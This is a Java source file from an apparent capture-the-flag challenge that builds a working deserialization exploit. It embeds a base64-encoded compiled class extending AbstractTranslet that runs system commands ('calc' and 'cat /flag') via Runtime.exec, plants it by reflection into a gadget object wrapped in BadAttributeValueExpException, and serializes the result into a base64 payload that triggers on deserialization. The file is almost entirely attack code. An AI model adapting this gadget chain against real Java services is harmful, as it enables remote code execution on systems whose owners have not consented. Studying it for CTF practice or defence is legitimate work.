package com.ezgame.ctf;

import com.ezgame.ctf.tools.ToStringDemo;
import com.ezgame.ctf.tools.Tools;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class Exp {
    public static void main(String[] args) throws Exception {
        ToStringDemo toStringDemo = new ToStringDemo();

        String shellClass = "yv66vgAAADMAZgoAEAA8CgA9AD4IAD8KAD0AQAoAQQBCBwBDCgAGADwKAEQARQoABgBGCQBHAEgKAEkASggASwcATAoADQBNBwBOBwBPAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABFMU2VyaS9TaGVsbENsYXNzOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABnJlc3VsdAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAZidWZmZXIBAAJbQgEABmxlbmd0aAEAAUkBAA1TdGFja01hcFRhYmxlBwBQBwBDBwAhAQAKRXhjZXB0aW9ucwcAUQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAFIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwcATAEAClNvdXJjZUZpbGUBAA9TaGVsbENsYXNzLmphdmEMABEAEgcAUwwAVABVAQAJY2F0IC9mbGFnDABWAFcHAFgMAFkAWgEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwBQDABbAFwMAF0AXgcAXwwAYABhBwBiDABjAGQBAARjYWxjAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAZQASAQAPU2VyaS9TaGVsbENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABHJlYWQBAAUoW0IpSQEABXdyaXRlAQAHKFtCSUkpVgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEAD3ByaW50U3RhY2tUcmFjZQAhAA8AEAAAAAAABQABABEAEgABABMAAAAvAAEAAQAAAAUqtwABsQAAAAIAFAAAAAYAAQAAABgAFQAAAAwAAQAAAAUAFgAXAAAACQAYABkAAgATAAAAuwAEAAUAAAA5uAACEgO2AAS2AAVMuwAGWbcAB00RBAC8CE4rLbYACFk2BAKfAA4sLQMVBLYACaf/7LIACiy2AAuxAAAAAwAUAAAAHgAHAAAAIgAMACMAFAAkABoAJgAmACcAMQApADgAKgAVAAAANAAFAAAAOQAaABsAAAAMAC0AHAAdAAEAFAAlAB4AHwACABoAHwAgACEAAwAiABcAIgAjAAQAJAAAABIAAv4AGgcAJQcAJgcAJ/wAFgEAKAAAAAQAAQApAAEAKgArAAIAEwAAAD8AAAADAAAAAbEAAAACABQAAAAGAAEAAAAvABUAAAAgAAMAAAABABYAFwAAAAAAAQAsAC0AAQAAAAEALgAvAAIAKAAAAAQAAQAwAAEAKgAxAAIAEwAAAEkAAAAEAAAAAbEAAAACABQAAAAGAAEAAAA0ABUAAAAqAAQAAAABABYAFwAAAAAAAQAsAC0AAQAAAAEAMgAzAAIAAAABADQANQADACgAAAAEAAEAMAAIADYAEgABABMAAABhAAIAAQAAABK4AAISDLYABFenAAhLKrYADrEAAQAAAAkADAANAAMAFAAAABYABQAAABsACQAeAAwAHAANAB0AEQAfABUAAAAMAAEADQAEADcAOAAAACQAAAAHAAJMBwA5BAABADoAAAACADs=";
        System.out.println(shellClass);
        Field field = toStringDemo.getClass().getDeclaredField("ClassByte");
        field.setAccessible(true);
        field.set(toStringDemo, Base64.getDecoder().decode(shellClass));

        BadAttributeValueExpException b = new BadAttributeValueExpException(null);
        Field field1 = b.getClass().getDeclaredField("val");
        field1.setAccessible(true);
        field1.set(b , toStringDemo);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeUTF("gadgets");
        oos.writeInt(2021);
        oos.writeObject(b);

        String payload = Tools.base64Encode(baos.toByteArray());
        read(payload);

    }

    public static void read(String payload) throws IOException, ClassNotFoundException {
        byte[] b = Tools.base64Decode(payload);
        InputStream inputStream = new ByteArrayInputStream(b);
        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
        String name = objectInputStream.readUTF();
        int year = objectInputStream.readInt();
        if (name.equals("gadgets") && year == 2021)
            objectInputStream.readObject();
    }
}
